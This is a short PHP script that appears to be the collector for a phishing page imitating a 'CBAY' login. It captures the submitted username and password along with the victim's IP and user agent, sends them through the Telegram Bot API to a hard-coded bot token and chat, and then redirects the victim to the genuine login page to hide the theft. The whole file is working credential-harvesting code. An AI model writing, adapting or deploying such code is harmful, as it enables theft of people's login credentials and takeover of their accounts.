<?php
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];


$botApiToken = '6999963979:AAHY-DWqverjhUgNxYkoegHLZ32S2GZbqGI';
$channelId ='6003330631';
$text = 'CBAY LOGIN
USER = '.$username.'
PASS = '.$password.'
IP = '.$ip.'
UA = '.$userAgent.'
';

$query = http_build_query([
    'chat_id' => $channelId,
    'text' => $text,
]);
$url = "https://api.telegram.org/bot{$botApiToken}/sendMessage?{$query}";

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_exec($ch);
//Peek&Cloppenburg💫40+💫 - Online Shops
header('Location: https://cbay.is/auth/login');
?>
